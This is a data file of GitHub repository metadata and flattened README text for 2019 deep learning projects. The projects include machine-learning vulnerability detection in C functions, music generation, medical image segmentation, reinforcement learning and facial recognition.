DanielLin1986,Function-level-Vulnerability-Detection,n/a,Function level Vulnerability Detection Hi there welcome This is an open source project for source code level vulnerability detection based on the supervised machine learning technqiue This project contains a framework which encapsulates 6 mianstream neural network models and can be easily extended to use other network models implemented using Keras or Tensorflow It also provides 3 embedding methods i e Word2vec GloVe and FastText for generating code embeddings The framework does not require any code analysis It takes source code i e functions or files as input and the output is a probability of the corresponding input sample being vulnerable or not For this project we also collected vulnerable functions from 9 open source software projects written in C programming language See Dataset https github com Seahymn2019 Function level Vulnerability Dataset blob master Vulnerable 20Functions 20Statistical 20Analysis md for more details We have detailed the framework design and data collection processes in a paper which is currently under review When the review process is completed we will publish all the data Requirements Environments Please refer to requiredpackages txt https github com DanielLin1986 Function level Vulnerability Detection blob master requiredpackages txt Hardware A GPU with at least 4GB RAM is recommended Using CPU for training takes considerable time Instructions Usage Unzip the zip file of this repository one will see the following folders The config folder containing the configuration file The data folder containing the source code functions vulnerable and non vulnerable The result folder containing the sample results The src folder containing the code for model training and test And there are two Python script files main py for training and testing a specified network model By specifying different options parameters users can apply different embedding methods and switch between training and testing mode Obtainrepresentations py for obtaining high level representations from a trained network model The options parameters available for performing a training test task which are listed below Options Description config Path to the configuration file seed Random seed for reproduction of the results datadir The path of the code base for training can be obtained by download unzip the files under data folder By default it is data logdir Path to store training logs log files for Tensorboard By default it is logs outputdir The output path of the trained network model By default it is result models trainedmodel The path of the trained model for test By default the trained models are stored in result models embedding The embedding method for converting source code sequences to meaningful vector representations Currently we also support Word2vec GloVe and FastText By default the Word2vec method is used test Switch to the test mode verbose Show all messages Step 1 Train a neural network model The parameters related to experiment model settings are stored in a yaml configuration file This allows users to conveniently adjust the settings by just changing the configuration file See documentation and examples config for more details Once the configuration file is ready one may run the following command to train a neural network model Python main py config configconfig yaml datadir By default the data which is the source code for training is at data folder and the embedding method used is the Word2vec embedding The trained models will be placed at result models folder The logs during the training phase will be at logs folder A user can use Tensorboard to visualize the training process by specifying the logs folder when invoking the Tensorboard To use the other embedding methods for example to use the FastText for converting the source code users can type the following Python main py config configconfig yaml datadir embedding FastText Step 2 Test a trained neural network model When training is completed a user can test a network model on the test set by using following command Python main py config configconfig yaml test trainedmodel D Pathofthetrainedmodel h5 Users can use their own test set by specifying the usingseparatetestset to True in the config yaml file Step 3 Obtain high level representations from any layer of a network model When training is completed a user can obtain high level representations from any layer of a trained network model Suppose a user has a few samples stored in homeusernamedatapath The user wants to have the representations from the 5 th layer the number of layers starts from 0 Then a user can type Python Obtainrepresentations py config configconfig yam inputdir trainedmodel layer 5 savedpath The representations of the samples extracted from the 5 th layer of the model will be saved in the Pickle format and stored in the path pathtosave The obtained representations can be used as features for various tasks For example them can be used to train a random forest classifier Dataset and Results Dataset https github com Seahymn2019 Function level Vulnerability Dataset blob master Vulnerable 20Functions 20Statistical 20Analysis md containing vulnerable and non vulnerable functions labeled collected from 9 open source projects and data statistics Training and Evaluation Results https github com Seahymn2019 Function level Vulnerability Dataset blob master Training 20and 20Results md containing test results for reference Contact You are welcomed to use modify our code Any bug report or improvement suggestions will be appreciated Please kindly cite our paper when it is published if you use the code data in your work For acquiring more data or inquiries please contact junzhang swin edu au Thanks,2019-09-05T03:26:23Z,2019-10-20T12:29:09Z,Python,DanielLin1986,User,1,1,0,29,master,DanielLin1986,1,0,0,0,0,0,0
CheeAn-Yu,DLCV2019,n/a,DLCV2019,2019-09-10T01:42:08Z,2019-09-24T12:03:53Z,Jupyter Notebook,CheeAn-Yu,User,1,1,1,5,master,CheeAn-Yu,1,0,0,0,0,0,0
brunosan,iris-ai,n/a,iris ai Detect Banknotes using Deep Learning AI documentation To convert to IPython notebook to html use this command sh jupyter nbconvert to html Iris ipynb,2019-08-17T22:02:15Z,2019-09-10T03:56:02Z,Jupyter Notebook,brunosan,User,1,1,1,33,master,brunosan,1,0,0,0,0,0,2
DebarghaG,Tansen,n/a,Tansen License Badge https img shields io github license DebarghaG Tansen style plastic made with python https img shields io badge Made 20with Python 1f425f svg Tansen is a project on music generation In a nutshell we aim to generate polyphonic music of multiple tracks instruments in Indian classical music Currently the proposed models are able to generate bad music either from scratch or by accompanying a track given a priori by the user We train the model with IIT Kanpur Media Lab Asia s database of common Indian classical ragas We re also working on creating our own in house dataset to boost work in this field Requirements Python 3 x Installing the following packages using pip Music21 Keras Tensorflow h5py Getting Started To train the network you run trainnetwork py E g python trainnetwork py The network will use every midi file in midisongs to train the network The midi files should only contain a single instrument to get the most out of the training NOTE You can stop the process at any point in time and the weights from the latest completed epoch will be available for text generation purposes Generating music Once you have trained the network you can generate text using generatemusic py E g python generatemusic py Contributing Pull requests are welcome For major changes please open an issue first to discuss what you would like to change Future Work This project was written very quickly with no performance or stability features in mind the code base suffered accordingly Results are currently significantly not as well as the state of the art Expect things to be cleaned up soon though License MIT https choosealicense com licenses mit Literature Review A good place to get started is umbrellabeach s list of resources for working on music generation Papers Melody Generation for Pop Music via Word Representation of Musical Properties 2017 10 arXiv https arxiv org abs 1710 11549 Code https github com mil tokyo NeuralMelody Generating Nontrivial Melodies for Music as a Service 2017 10 arXiv https arxiv org abs 1710 02280 Page https composing ai MuseGAN Symbolic domain Music Generation and Accompaniment with Multi track Sequential Generative Adversarial Networks 2017 9 arXiv https arxiv org abs 1709 06298 Page https salu133445 github io musegan Similarity Embedding Network for Unsupervised Sequential Pattern Learning by Playing Music Puzzle Games 2017 9 arXiv https arxiv org abs 1709 04384 Page https remyhuang github io DJnet A Tutorial on Deep Learning for Music Information Retrieval 2017 9 arXiv https arxiv org abs 1709 04396 Deep Learning Techniques for Music Generation A Survey 2017 9 arXiv https arxiv org abs 1709 01620 Neural Translation of Musical Style 2017 8 arXiv https arxiv org abs 1708 03535 Page http imanmalik com cs 2017 06 05 neural style html GLSR VAE Geodesic Latent Space Regularization for Variational AutoEncoder Architectures 2017 7 arXiv https arxiv org abs 1707 04588 Learning and Evaluating Musical Features with Deep Autoencoders 2017 6 arXiv https arxiv org abs 1706 04486 Objective Reinforced Generative Adversarial Networks ORGAN for Sequence Generation Models 2017 5 arXiv https arxiv org abs 1705 10843 Code https github com gablg1 ORGAN MidiNet A Convolutional Generative Adversarial Network for Symbolic domain Music Generation using 1D and 2D Conditions ISMIR 2017 2017 3 arXiv https arxiv org abs 1703 10847 Page https richardyang40148 github io TheBlog midinetarxivdemo html Automatic Conversion of Pop Music into Chiptunes for 8 bit Pixel Art ICASSP 2017 2017 2 Paper http mac citi sinica edu tw yang pub su17icassp8bit pdf Code https github com LemonATsu pop to 8bit Page https lemonatsu github io C RNN GAN Continuous Recurrent Neural Networks with Adversarial Training 2016 11 arXiv https arxiv org abs 1611 09904 Code https github com olofmogren c rnn gan Tuning Recurrent Neural Networks with Reinforcement Learning ICLR 2017 2016 11 arXiv https arxiv org abs 1611 02796 Web https magenta tensorflow org 2016 11 09 tuning recurrent networks with reinforcement learning Code https github com tensorflow magenta tree master magenta models rltuner SeqGAN Sequence Generative Adversarial Nets with Policy Gradient AAAI 2017 2016 9 Paper http www aaai org ocs index php AAAI AAAI17 paper download 14344 14489 Code https github com LantaoYu SeqGAN Song From PI A Musically Plausible Network for Pop Music Generation ICLR 2017 arXiv https arxiv org abs 1611 03477 Text based LSTM networks for Automatic Music Composition 2016 4 arXiv https arxiv org abs 1604 05358 Web https keunwoochoi wordpress com 2016 02 23 lstmetallica Code https github com keunwoochoi LSTMetallica Music Transcription Modelling and Composition Using Deep Learning 2016 4 arXiv https arxiv org abs 1604 08723 Code https github com IraKorshunova folk rnn Composing A Melody with Long short Term Memory LSTM Recurrent Neural Networks 2016 2 Web http konstilackner github io LSTM RNN Melody Composer Website Code https github com konstilackner LSTM RNN Melody Composer Paper http konstilackner github io LSTM RNN Melody Composer Website Thesisfinal01 pdf Neural Adaptive Sequential Monte Carlo NIPS 2015 2015 Paper http papers nips cc paper 5961 neural adaptive sequential monte carlo pdf A Recurrent Latent Variable Model for Sequential Data NIPS 2015 2015 Paper http papers nips cc paper 5653 a recurrent latent variable model for sequential data pdf Code https github com jych nips2015vrnn AI Methods in Algorithmic Composition A Comprehensive Survey 2013 Paper http www jair org media 3908 live 3908 7454 jair pdf Modeling Temporal Dependencies in High dimensional Sequences Application to Polyphonic Music Generation and Transcription 2012 arXiv https arxiv org abs 1206 6392 Towards Adaptive Music Generation By Reinforcement Learning of Musical Tension 2010 Paper https ccrma stanford edu slegroux affect pubs SMC2010 pdf A First Look at Music Composition using LSTM Recurrent Neural Networks 2002 Web http www iro umontreal ca eckdoug blues index html Paper http www iro umontreal ca eckdoug blues IDSIA 07 02 pdf Blogs Neural Nets for Generating Music Web https medium com kcimc neural nets for generating music f46dffac21c0 How to Generate Music using a LSTM Neural Network in Keras Web https towardsdatascience com how to generate music using a lstm neural network in keras 68786834d4c5 Generative Music with JavaScript Web Audio Web https teropa info generative music slides The Current State Of AI Artificial Intelligence In Music Movies More 2017 7 Web http www hypebot com hypebot 2017 07 ai today the current state of artificial intelligence html Composing Music With Recurrent Neural Networks 2015 8 Web http www hexahedria com 2015 08 03 composing music with recurrent neural networks Code https github com hexahedria biaxial rnn music composition Codes Google Magenta Web https magenta tensorflow org welcome to magenta Code https github com tensorflow magenta Deep Jazz Web https deepjazz io Code https deepjazz io BachBot Web http bachbot com Code https github com feynmanliang bachbot WaveNet Code https github com ibab tensorflow wavenet not fully GRUV Code https github com MattVitelli GRUV Kulitta Code https github com donya Kulitta Classical Music Composer Code https github com Skuldur Classical Piano Composer Conferences Workshops ACM MM ACM MultiMedia Web http www acmmm org 2017 ISMIR The International Society of Music Information Retrieval Web http www ismir net ICASSP Conference on Acoustics Speech and Signal Processing Web http www ieee icassp2017 org DLM Deep Learning for Music Workshop Web http dorienherremans com dlm2017 CSMC Conference on Computer Simulation of Musical Creativity Web https csmc2016 wordpress com CCRMA Center for Computer Research in Music and Acoustics Stanford University Web https ccrma stanford edu ICMC Internatonal Computer Music Conference Web http www icmc2017 com Lists http www icmc2017 com cn page1 html Applications Google A I Duet Link https aiexperiments withgoogle com ai duet The Infinite Drum Machine Link https aiexperiments withgoogle com drum machine Amper Music Link https www ampermusic com app Intelligent Music System Link http 120 52 72 53 www intelligentmusicsystems com c3pr90ntc0td vid temposhifting mp4 Unwind Link http unwind ai Tidalcycles Link https tidalcycles org Video https www youtube com watch v xoa3OT8ncX0,2019-08-13T17:18:55Z,2019-08-28T04:26:31Z,Python,DebarghaG,User,1,1,1,4,master,DebarghaG,1,0,0,0,0,0,0
u04617,Deep-Learning-based-Motion-Intention-Estimation-using-EEG-Signals,n/a,Deep Learning based Motion Intention Estimation using EEG Signals This code is written to estimate Human Motion Intention using Deep Learning Artificial Neural Network I have used 61 Channel EEGs The data was obtained from BNCI Website http bnci horizon 2020 eu database data sets The dataset description is also uploaded,2019-08-16T02:27:27Z,2019-08-18T10:53:23Z,Python,u04617,User,1,1,0,2,master,u04617,1,0,0,0,0,0,0
Murtuza-Chawala,Real-Time-Object-Detection-using-Deep-Learning-and-Python,n/a,Real Time Object Detection using Deep Learning and Python Detect upto 50 objects in real time using pre trained deep learning models along with OpenCV and Python This algorithm can detect the following objects in real time background aeroplane bicycle bird boat bottle bus car cat chair cow diningtable dog horse motorbike person pottedplant sheep sofa train tvmonitor Object Detection 1 Screenshot 20from 202019 09 15 2013 07 26 png Object Detection 2 Screenshot 20from 202019 09 15 2013 08 59 png,2019-09-15T07:42:07Z,2019-09-15T07:53:14Z,Jupyter Notebook,Murtuza-Chawala,User,1,1,0,6,master,Murtuza-Chawala,1,0,0,0,0,0,0
Tommas10,Deep-Learning---Forward-Propagation-Calculation-Process-for-LSTM-Neural-Networks-,n/a,Deep Learning Forward Propagation Calculation Process for LSTM Neural Networks Python Jupyter Under Microsoft Windows 10,2019-08-22T13:25:54Z,2019-08-22T13:34:04Z,Jupyter Notebook,Tommas10,User,1,1,0,2,master,Tommas10,1,0,0,0,0,0,0
rafaelsdellama,Deep-Learning-com-Python-de-A-Z---O-Curso-Completo,n/a,,2019-08-19T01:46:05Z,2019-11-27T18:33:30Z,Python,rafaelsdellama,User,1,1,0,1,master,rafaelsdellama,1,0,0,0,0,0,0
tejasdhasarali,Suicidal-Thought-and-Suicide-Attempt-Prediction-Using-Deep-Learning,n/a,Suicidal Thought and Suicide Attempt Prediction Using Deep Learning The project aims to predict the Suicidal Thoughts and Suicide Attempts with the help of Neural Network The data was collected from the National Comorbidity Survey NCS 1 which was conducted in 1990 to spring 1992 The questions for this survey was prepared based on the book Diagnostic and Statistical Manual of Mental Disorders DSM which defines and classifies mental disorders to improve diagnoses treatment and research In the collected data the number of people who had suicidal thoughts or attempted suicide was very less compared to the people who haven t This data imbalance problem was solved using upsampling SMOTE and Class weights Five models each for Suicidal Thought and Suicide Attempt was built using Fully Connected and Locally Connected Neural Networks The results of these trained neural networks was cross verified using stratified 10 fold cross validations A new consensus method was used on the five trained models to improve the accuracy and reliability of the trained models In consensus method at least k out of n models should predict the same class with a probability greater than the selected threshold Finally the model s prediction was interpreted to find the features that are affecting the model s classification positively and negatively The model was interpreted by finding the Jacobian Matrix Gradient of the model s classification with respect to each input feature The research paper on this project is being written and will be published this year After that the code will be made public,2019-09-17T00:44:54Z,2019-09-29T08:28:45Z,n/a,tejasdhasarali,User,1,1,0,2,master,tejasdhasarali,1,0,0,0,0,0,0
metsey99,ITU-ACM-19-20-Introduction-to-Deep-Learning-Study-Group,n/a,Instructors Metehan Seyran Computer Engineering 3 I T U LinkedIn https www linkedin com in metehan seyran Prerequisities 1 Basic knowledge about Python programming language Goal Make students familiarize concepts about Machine and mostly Deep Learning Syllabus Date Topic Description 11 October 2019 Course Introduction Deep Learning nedir kullanm alanlar nelerdir niye bu kadar popler gibi sorulara deinilip ksaca syllabus tan bahsedi 18 October 2019 Logistic Regression NumPy 1 Logistic Regression algoritmas ve NumPy ile implemente edilmesi arlkl olarak NumPy 25 October 2019 Logistic Regression NumPy 2 Logistic Regression algoritmas ve NumPy ile implemente edilmesi implementation 15 November 2019 Linear classification and Loss Function Nral alarda gerekleen forward propagation ve kayp fonksiyonu 22 November 2019 Backpropagation Deeper Neural Networks Nral alarda gerekleen update olaylar ve birden fazla katmanl derin nral alar 29 November 2019 Hyperparameter Tuning Nral Alarda zerinde yaplan kk verimli uygulamalar 6 December 2019 Implementation using a framework Seilen bir Python framework kullanarak NumPy ile yazlm kodlar karlatrma Lessons will be around 1 30 2 hours Important Links The Deep Learning Book https www deeplearningbook org Deep Learning Specialization https www deeplearning ai Stanford Introduction to Deep Learning Course http cs231n stanford edu More will be added Suggested Readings The Deep Learning Book https www deeplearningbook org More will be added Project Short project details For more information visit the Project file Project,2019-09-19T19:09:50Z,2019-12-06T14:46:53Z,Jupyter Notebook,metsey99,User,1,1,1,11,master,metsey99,1,0,0,0,0,0,0
ActiveNeuron,List-of-Deep-Learning-based-Semantic-Segmentation-Models,n/a,List of Deep Learning based Semantic Segmentation Models This repository includes various types of deep learning based Semantic Segmentation Models 2014 Fully Convolutional Networks for Semantic Segmentation U Net based Models 2015 PARSENET LOOKING WIDER TO SEE BETTER U Net Convolutional Networks for Biomedical Image Segmentation MICCAI SegNet A Deep Convolutional Encoder Decoder Architecture for Robust Semantic Pixel Wise Labelling 2016 V Net Fully Convolutional Neural Networks for Volumetric Medical Image Segmentation paper caffe pytorch 3D U Net Learning Dense Volumetric Segmentation from Sparse Annotation paper pytorch RefineNet Multi Path Refinement Networks for High Resolution Semantic Segmentation Efficient Piecewise Training of Deep Structured Models for Semantic Segmentation ENet A Deep Neural Network Architecture for Real Time Semantic Segmentation Light Weight RefineNet for Real Time Semantic Segmentation The One Hundred Layers Tiramisu Fully Convolutional DenseNets for Semantic Segmentation PixelNet Towards a General Pixel Level Architecture Full Resolution Residual Networks for Semantic Segmentation in Street Scenes Laplacian Pyramid Reconstruction and Refinement for Semantic Segmentation Semantic Segmentation using Adversarial Networks Path Aggregation Network for Instance Segmentation 2017 Densely Connected Convolutional Networks H DenseUNet Hybrid Densely Connected UNet for Liver and Tumor Segmentation from CT Volumes IEEE Transactions on Medical Imaging Ladder style DenseNets for Semantic Segmentation of Large Natural Images Framing U Net via Deep Convolutional Framelets Application to Sparse view CT GP Unet Lesion Detection from Weak Labels with a 3D Regression Network MICCAI Sequential 3D U Nets for Biologically Informed Brain Tumor Segmentation Dilated Residual Networks LinkNet Exploiting Encoder Representations for Efficient Semantic Segmentation Efficient ConvNet for Real time Semantic Segmentation Pyramid Scene Parsing Network Segmentation Aware Convolutional Networks Using Local Attention Masks PIXEL DECONVOLUTIONAL NETWORKS M NET A CONVOLUTIONAL NEURAL NETWORK FOR DEEP BRAIN STRUCTURE SEGMENTATION 2018 UNet A Nested U Net Architecture for Medical Image Segmentation MICCAI MDU Net Multi scale Densely Connected U Net for biomedical image segmentation DUNet A deformable network for retinal vessel segmentation RA UNet A hybrid deep attention aware network to extract liver and tumor in CT scans Dense Multi path U Net for Ischemic Stroke Lesion Segmentation in Multiple Image Modalities Stacked Dense U Nets with Dual Transformers for Robust Face Alignment Prostate Segmentation using 2D Bridged U net nnU Net Self adapting Framework for U Net Based Medical Image Segmentation SUNet a deep learning architecture for acute stroke lesion segmentation and outcome prediction in multimodal MRI IVD Net Intervertebral disc localization and segmentation in MRI with a multi modal UNet LADDERNET Multi Path Networks Based on U Net for Medical Image Segmentation Glioma Segmentation with Cascaded Unet Attention U Net Learning Where to Look for the Pancreas Recurrent Residual Convolutional Neural Network based on U Net R2U Net for Medical Image Segmentation Concurrent Spatial and Channel Squeeze Excitation in Fully Convolutional Networks A Probabilistic U Net for Segmentation of Ambiguous Images NIPS AnatomyNet Deep Learning for Fast and Fully Automated Whole volume Segmentation of Head and Neck Anatomy 3D RoI aware U Net for Accurate and Efficient Colorectal Cancer Segmentation Detection and Delineation of Acute Cerebral Infarct on DWI Using Weakly Supervised Machine Learning Fully Dense UNet for 2D Sparse Photoacoustic Tomography Artifact Removal RA UNet A hybrid deep attention aware network to extract liver and tumor in CT scans Automatic Multi Organ Segmentation on Abdominal CT With Dense V Networks DRINet for Medical Image Segmentation ICNet for Real Time Semantic Segmentation on High Resolution Images MultiNet Real time Joint Semantic Reasoning for Autonomous Driving SHUFFLESEG REAL TIME SEMANTIC SEGMENTATION NETWORK Learning to Adapt Structured Output Space for Semantic Segmentation Multi path segmentation network LadderNet Multi path networks based on U Net for medical image segmentation BiSeNet Bilateral Segmentation Network for Real time Semantic Segmentation ESPNet Efficient Spatial Pyramid of Dilated Convolutions for Semantic Segmentation Learning a Discriminative Feature Network for Semantic Segmentation CCNet Criss Cross Attention for Semantic Segmentation DenseASPP for Semantic Segmentation in Street Scenes CVPR PSANet Point wise Spatial Attention Network for Scene Parsing Convolutional CRFs for Semantic Segmentation 2019 MultiResUNet Rethinking the U Net Architecture for Multimodal Biomedical Image Segmentation U NetPlus A Modified Encoder Decoder U Net Architecture for Semantic and Instance Segmentation of Surgical Instrument Probability Map Guided Bi directional Recurrent UNet for Pancreas Segmentation CE Net Context Encoder Network for 2D Medical Image Segmentation Graph U Net A Novel Focal Tversky Loss Function with Improved Attention U Net for Lesion Segmentation ST UNet A Spatio Temporal U Network for Graph structured Time Series Modeling Connection Sensitive Attention U NET for Accurate Retinal Vessel Segmentation CIA Net Robust Nuclei Instance Segmentation with Contour aware Information Aggregation W Net Reinforced U Net for Density Map Estimation Automated Segmentation of Pulmonary Lobes using Coordination guided Deep Neural Networks ISBI oral U2 Net A Bayesian U Net Model with Epistemic Uncertainty Feedback for Photoreceptor Layer Segmentation in Pathological OCT Scans ScleraSegNet an Improved U Net Model with Attention for Accurate Sclera Segmentation ICB Honorable Mention Paper Award AHCNet An Application of Attention Mechanism and Hybrid Connection for Liver Tumor Segmentation in CT Volumes A Hierarchical Probabilistic U Net for Modeling Multi Scale Ambiguities Recurrent U Net for Resource Constrained Segmentation MFP Unet A Novel Deep Learning Based Approach for Left Ventricle Segmentation in Echocardiography A Partially Reversible U Net for Memory Efficient Volumetric Image Segmentation MICCAI 2019 ResUNet a a deep learning framework for semantic segmentation of remotely sensed data Optimized High Resolution 3D Dense U Net Network for Brain and Spine Segmentation Multi Scale Supervised 3D U Net for Kidney and Tumor Segmentation HyperDense Net A hyper densely connected CNN for multi modal image segmentation Dual Attention Network for Scene Segmentation Fast SCNN Fast Semantic Segmentation Network High Resolution Representations for Labeling Pixels and Regions UPSNet A Unified Panoptic Segmentation Network An Improved U Net Convolutional Networks for Seabed Mineral Image Segmentation DeepLab based Models 2017 Rethinking Atrous Convolution for Semantic Image Segmentation 2018 DeepLab Semantic Image Segmentation with Deep Convolutional Nets Atrous Convolution and Fully Connected CRFs Encoder Decoder with Atrous Separable Convolution for Semantic Image Segmentation 2019 Auto DeepLab Hierarchical Neural Architecture Search for Semantic Image Segmentation Other Models Pixel Adaptive Convolutional Neural Networks Gated SCNN Gated Shape CNNs for Semantic Segmentation A Two Stage GAN for High Resolution Retinal Image Generation and Segmentation Panoptic Segmentation CVPR 2019 Types of Convolution operation which contributed significantly to perform semaantic segmentation Xception Deep Learning with Depthwise Separable Convolutions Learning Deconvolution Network for Semantic Segmentation MULTI SCALE CONTEXT AGGREGATION BY DILATED CONVOLUTIONS Deconvolutional Networks https ieeexplore ieee org stamp stamp jsp tp arnumber 5539957 A guide to convolution arithmetic for deep learning https arxiv org pdf 1603 07285 pdf In Place Activated BatchNorm for Memory Optimized Training of DNNs CVPR Other Impotant Papers related to Segmentation Data augmentation using learned transformations for one shot medical image segmentation Understanding Deep Learning Techniques for Image Segmentation Impact of Adversarial Examples on Deep Learning Models for Biomedical Image Segmentation The Importance of Skip Connections in Biomedical Image Segmentation Large Kernel Matters Improve Semantic Segmentation by Global Convolutional Network 4D Spatio Temporal ConvNets Minkowski Convolutional Neural Networks Improving Semantic Segmentation via Video Propagation and Label Relaxation Improving Semantic Segmentation via Video Propagation and Label Relaxation Self Supervised Model Adaptation for Multimodal Semantic Segmentation Seamless Scene Segmentation CVPR Loss Max Pooling for Semantic Image Segmentation Asymmetric Non local Neural Networks for Semantic Segmentation Resources to get start with Sematic Segamentation https github com mrgloom awesome semantic segmentation https github com divamgupta image segmentation keras https github com ozan oktay Attention Gated Networks tree master models https github com aparecidovieira Roadextraction Datasets Datsets for Self Driving Cars IDD A Dataset for Exploring Problems of Autonomous Navigation in Unconstrained Environments BDD100K A Diverse Driving Video Database with Scalable Annotation Tooling The ApolloScape Open Dataset for Autonomous Driving and its Application The Cityscapes Dataset for Semantic Urban Scene Understanding CVPR 2016 KITTI Vision Benchmark Suite The Mapillary Vistas Dataset for Semantic Understanding of Street Scenes Microsoft COCO Common Objects in Context CamVid Motion based Segmentation and Recognition Dataset ADE20K MIT wilddash Scan net BioMedical Data Florescence Microscopy Images Murphy Lab Electron Microscopy Image ISBI 2012 Dermoscopy Image ISIC 2018 Endoscopy Image CVC ClinicDB Magnetic Resonance Image BraTS Resource for datasets https competitions codalab org competitions NVIDIA at 2019 CVPR https news developer nvidia com nvidia research at cvpr 2019 Research groups Mapillary Mapillary is a service for crowdsourcing street view photos Anyone can collect photos with simple tools like smartphones or action cameras The photos are then combined into a street level photo view By doing this places around world could be visualised by people who care about those places,2019-08-17T05:21:22Z,2019-08-31T01:03:50Z,n/a,ActiveNeuron,User,1,1,0,29,master,ActiveNeuron,1,0,0,0,0,0,0
venkateshsathya,Deep-learning-for-Moduation-classification-across-Channel-conditions,n/a,,2019-08-14T22:47:55Z,2019-10-08T19:32:23Z,n/a,venkateshsathya,User,1,1,0,0,master,,0,0,0,0,0,0,0
PacktPublishing,Sentiment-Analysis-through-Deep-Learning-with-Keras-and-Python,n/a,Sentiment Analysis through Deep Learning with Keras and Python Sentiment Analysis through Deep Learning with Keras and Python published by Packt,2019-09-12T14:50:28Z,2019-09-23T00:56:35Z,n/a,PacktPublishing,Organization,2,1,0,2,master,Asif-packt,1,0,0,0,0,0,0
FabianHeinemann,Deep_learning_for_liver_NAS_and_fibrosis_scoring,deep-neural-networks#histopathology#keras-tensorflow#python3,Deep learning for liver NAS and fibrosis scoring Repository for the publication Deep learning enables pathologist like scoring of NASH models Nature scientific reports 2019 https www nature com articles s41598 019 54904 6 Input Tiles of microscopy images of of mouse or rat liver tissue stained with Masson s trichrome see below for details on tiles Output result Discrete pathologist like liver scores on ballooning inflammation steatosis NAS score and fibrosis with scores optimized to follow the scores of a given ground truth with minimal error e g a pathologist Continuous liver scores on ballooning inflammation steatosis NAS score and fibrosis Spatial feature distribution of ballooning inflammation steatosis NAS score and fibrosis alt text https github com FabianHeinemann DeeplearningforliverNASandfibrosisscoring blob master image Fig1forGIT png Requirements Python 3 x Libraries keras tensorflow matplotlib pandas sklearn yaml plus a number of common libraries you will find them as imports Set up 1 Clone this repository 2 Download images model weights and other files from https osf io p48rd and extract all data under model Some subfolders contain zip files which need to be extracted by hand at their respective locations Training a new model Complete train yaml or a copy A least you need to set modelpath Path where the h5 file with the CNN weights will be stored modelfilename Filename of model groundtruthpath Path where the tiles with the ground truth are located Start training python train py c train yaml This will generate a new model file Please note that trained models for ballooning inflammation steatosis and fibrosis have been uploaded to https osf io p48rd and there is no need to train a new model unless you want to add own data Classification of a scanned liver section Prerequisite Higher resolution tiles of Masson trichrome stained liver 0 44 m px 299x299 px for ballooning inflammation and steatosis Placed under classificationdata tiles tiles Lower resolution tiles of Masson trichrome stained liver 1 32 m px 299x299 px for fibrosis Placed under classificationdata bigtiles tiles Completed settings file classifyKleinerscore yaml or a copy Run python classifyKleinerscore py c classifyKleinerscore yaml This will create the following files summary csv Ballooningsubscore csv Inflammationsubscore csv Steatosissubscore csv Fibrosisscore csv The first file contains results summarized per liver including discrete pathologist like scores and continuous scores The last four contain spatial data for each result full results Alternative optional Classify each score individually Prerequisite Higher resolution tiles of Masson trichrome stained liver 0 44 m px 299x299 px for ballooning inflammation and steatosis Placed under classificationdata tiles tiles Lower resolution tiles of Masson trichrome stained liver 1 32 m px 299x299 px for fibrosis Placed under classificationdata bigtiles tiles Completed settings file classify yaml or a copy Run python classify py c classify yaml Two files will be created summary csv csv The first file contains results summarized per liver including discrete pathologist like scores and continuous scores The second file contains spatial data for the score specified in classify yaml full results Determination of new thresholds and or computation of evaluation parameters Complete fitthresholdsettings yaml Run python fitthresholds py c fitthresholdsettings yaml Output Thresholds to map continuous liver scores to discrete pathologist scores with minimized error if fitnewthresholds True Output of various evaluation parameters mean absolute error weighted precision weighted F1 Cohens Kappa comparing ground truth of NAS and fibrosis score with computeted result of NAS and fibrosis score Class activation maps Run within jupyter notebook and complete paths inside CNNclassactivationmap ipynb alt text https github com FabianHeinemann DeeplearningforliverNASandfibrosisscoring blob master classactivationmapimages test 162246064724cam png,2019-09-18T07:56:51Z,2019-12-06T09:30:49Z,Jupyter Notebook,FabianHeinemann,User,1,1,0,86,master,FabianHeinemann,1,0,0,0,0,0,0
ZhouYuxuanYX,Solving-MountainCar-v0-using-deep-Q-learning,n/a,Solving MountainCar v0 using deep Q learning Keras implementation with workable hyperparameters It is a reproduction of 1 MountainCar v0 As described in OpenAI s Gym documentation https gym openai com envs MountainCar v0 A car is on a one dimensional track positioned between two mountains The goal is to drive up the mountain on the right however the car s engine is not strong enough to scale the mountain in a single pass Therefore the only way to succeed is to drive back and forth to build up momentum Q learning SARSAR max Q learning is an online action value function learning with an exploration policy epsilon greedy is used in this implementation References 1 https towardsdatascience com reinforcement learning w keras openai dqns 1eed3a5338c 2 http www0 cs ucl ac uk staff d silver web Teaching html,2019-08-08T12:04:32Z,2019-11-30T15:07:55Z,Python,ZhouYuxuanYX,User,0,1,0,12,master,ZhouYuxuanYX,1,0,0,0,0,0,0
koustavagoswami,Autonomous-Car-Driving-using-Deep-Reinforcement-Learning-in-Carla-Simulator,n/a,Autonomous Car Driving using Deep Reinforcement Learning in Carla Simulator The code has been implemented in Carla Simulator with the help of Double DQN to train an agent how to drive autonomously using different architecture To train the agent in command line pass the parameter Train and after training to test how the agent is behaving pass Run as parameter The code has been uploaded as zip file as it contains multiple folders which requires to run the code The steps to run the code is 1 Install Carla in the machine 2 Fork the zip file in local machine 3 Unzip the file 4 Train and Run the agent in Carla,2019-08-20T19:49:41Z,2019-12-02T15:54:58Z,n/a,koustavagoswami,User,1,1,1,5,master,koustavagoswami,1,0,0,0,0,0,0
brijeshiitg,GNCNN-Deep_learning_for_steganalysis_via_convolutional_neural_networks,n/a,Pytorch implementation of GNCNN Pytorch implementation of GNCNN Deep Learning for Steganalysis via Convolutional Neural Networks https www spiedigitallibrary org conference proceedings of spie 9409 94090J Deep learning for steganalysis via convolutional neural networks 10 1117 12 2083479 full SSO 1 Qian et al The model train validation test accuracy has also been plotted when training on S UNIWARD 0 4bpp,2019-09-12T10:36:08Z,2019-10-26T06:34:36Z,Python,brijeshiitg,User,1,1,2,8,master,brijeshiitg,1,0,0,0,0,0,0
arojan,Facial-Recognition-with-Deep-Neural-Networks-and-Transfer-Learning,n/a,Facial Recognition with Deep Neural Networks and Transfer Learning This is a facial recognition system recognising the faces of various individuals During this project the model was trained only on seven individual s faces Hence the system will only recognize the faces of seven individuals This project attempts to recognise human faces with higher accuracy while having fewer data to train on with the use of transfer learning I would like to thank Ajay Maharjan Ankit Dahal Kabir Tamang Prabesh Hada Sasim Sunwar Sundar Bhattrai and Suryansh Mathema And I would like to send regards to Mr Saroj Lamichhane and Mr Bijay Limbu Senihang for being there as my project supervisors and supporting me along the way Go ahead and download the pre trained model rcmallivggfacetfvgg16 h5 from the site https github com rcmalli keras vggface releases and store it in the models directory of this repository Add your custom dataset in the dataset directory of this repository Do some minor adjustments according to your need and its ready to go Things to note 1 First install the following dependencies pip install user requirement requirements txt 2 Second fire the terminal and go to the project directory Once there follow chmod x script py python script py 3 Follow the user manual for further 